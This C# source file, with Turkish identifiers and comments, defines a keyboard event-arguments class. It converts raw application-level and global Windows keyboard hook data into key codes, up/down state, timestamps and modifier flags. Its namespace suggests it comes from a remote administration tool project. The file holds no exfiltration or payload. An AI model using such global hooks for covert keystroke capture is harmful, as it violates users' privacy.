using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using xServer.KuuhakuCekirdek.MouseKeyHook.WinApi;

namespace xServer.KuuhakuCekirdek.MouseKeyHook
{
    public class EventArgsExtKlavye : KeyEventArgs
    {
        public EventArgsExtKlavye(Keys tuşVerisi)
            : base(tuşVerisi)
        {
        }

        internal EventArgsExtKlavye(Keys tuşVerisi, int zamandamgasi, bool TuşDown, bool TuşUp)
            : this(tuşVerisi)
        {
            ZamanDamgası = zamandamgasi;
            IsKeyDown = TuşDown;
            IsKeyUp = TuşUp;
        }

        public int ZamanDamgası { get; private set; }
        public bool IsKeyDown { get; private set; }
        public bool IsKeyUp { get; private set; }

        internal static EventArgsExtKlavye FromRawDataApp(CallbackData data)
        {
            var wParam = data.WParam;
            var lParam = data.LParam;


            const uint maskKeydown = 0x40000000; // bit 30
            const uint maskKeyup = 0x80000000; // bit 31

            var timestamp = Environment.TickCount;

            var flags = (uint) lParam.ToInt64();

            //bit 30 bir önceki tuş durumu
            var wasKeyDown = (flags & maskKeydown) > 0;
            //bit 31 transition durumu
            var isKeyReleased = (flags & maskKeyup) > 0;

            var keyData = AppendModifierStates((Keys) wParam);

            var isKeyDown = !wasKeyDown && !isKeyReleased;
            var isKeyUp = wasKeyDown && isKeyReleased;

            return new EventArgsExtKlavye(keyData, timestamp, isKeyDown, isKeyUp);
        }

        internal static EventArgsExtKlavye FromRawDataGlobal(CallbackData data)
        {
            var wParam = data.WParam;
            var lParam = data.LParam;
            var keyboardHookStruct =
                (KeyboardHookStruct) Marshal.PtrToStructure(lParam, typeof (KeyboardHookStruct));
            var keyData = AppendModifierStates((Keys) keyboardHookStruct.VirtualKeyCode);

            var tuşKodu = (int) wParam;
            var TuşDown = (tuşKodu == Messages.WM_KEYDOWN || tuşKodu == Messages.WM_SYSKEYDOWN);
            var TuşUp = (tuşKodu == Messages.WM_KEYUP || tuşKodu == Messages.WM_SYSKEYUP);

            return new EventArgsExtKlavye(keyData, keyboardHookStruct.Time, TuşDown, TuşUp);
        }

        private static bool CheckModifier(int vKey)
        {
            return (KeyboardNativeMethods.GetKeyState(vKey) & 0x8000) > 0;
        }

        private static Keys AppendModifierStates(Keys keyData)
        {
            // CTRL tuşu basılı mı?
            var control = CheckModifier(KeyboardNativeMethods.VK_CONTROL);
            // Shift tuşu basılı mı?
            var shift = CheckModifier(KeyboardNativeMethods.VK_SHIFT);
            // Alt tuşu basılı mı?
            var alt = CheckModifier(KeyboardNativeMethods.VK_MENU);


            return keyData |
                   (control ? Keys.Control : Keys.None) |
                   (shift ? Keys.Shift : Keys.None) |
                   (alt ? Keys.Alt : Keys.None);
        }
    }
}